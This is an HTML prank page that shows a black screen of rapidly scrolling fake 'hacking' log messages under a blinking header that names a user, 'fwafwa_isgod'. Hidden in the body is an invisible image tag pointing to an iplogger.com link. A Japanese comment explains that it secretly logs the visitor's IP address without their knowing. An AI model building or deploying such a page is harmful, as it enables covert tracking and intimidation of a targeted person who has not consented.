<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>SYSTEM_HACKING_NOW</title>
    <style>
        body {
            background-color: black;
            color: #00FF00;
            font-family: 'Courier New', Courier, monospace;
            overflow: hidden;
            margin: 0;
            padding: 20px;
        }

        #header {
            color: red;
            font-size: 30px;
            text-align: center;
            font-weight: bold;
            text-shadow: 0 0 10px red;
            margin-bottom: 20px;
            animation: blink 0.5s infinite;
        }

        @keyframes blink { 50% { opacity: 0; } }

        #log-container {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            font-size: 12px;
            line-height: 1.2;
        }

        .log-item { width: 30%; }
    </style>
</head>
<body>

    <!-- 透明な画像としてIPロガーを読み込む（相手には見えない） -->
    <img src="https://iplogger.com/2ednu6" style="display:none;">

    <div id="header">hacking of fwafwa_isgod</div>
    <div id="log-container"></div>

    <script>
        const container = document.getElementById('log-container');
        const phrases = [
            ">> hacking......",
            ">> Scanning port 80...",
            ">> Data packet sent...",
            ">> Connection established...",
            ">> Bypassing security...",
            ">> [SYSTEM] Access Granted",
            ">> Fetching user data...",
            ">> Uploading to cloud..."
        ];

        function addLog() {
            const item = document.createElement('div');
            item.className = 'log-item';
            item.textContent = phrases[Math.floor(Math.random() * phrases.length)];
            container.appendChild(item);
            if (container.childNodes.length > 300) {
                container.removeChild(container.firstChild);
            }
        }

        // 30ミリ秒ごとに爆速追加（さらに動画映えアップ）
        setInterval(addLog, 30);
    </script>
</body>
</html>
